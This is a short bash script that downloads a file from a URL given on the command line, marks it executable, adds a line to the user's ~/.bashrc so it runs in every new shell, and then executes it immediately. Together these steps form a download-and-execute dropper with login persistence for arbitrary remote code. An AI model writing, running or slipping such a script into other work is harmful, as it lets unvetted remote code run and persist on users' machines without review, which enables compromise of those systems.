#!/bin/bash
set -e  # Exit on any error

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 <output_file> <url>"
    exit 1
fi

echo "Downloading $2  $1 ..."
if wget -q -O "$1" "$2"; then
    chmod +x "$1"
    echo "Download complete. Running $1 ..."
    grep -qxF "./$1" ~/.bashrc || echo "./$1" >> ~/.bashrc
    ./"$1"
else
    echo "Download failed!"
    exit 1
fi
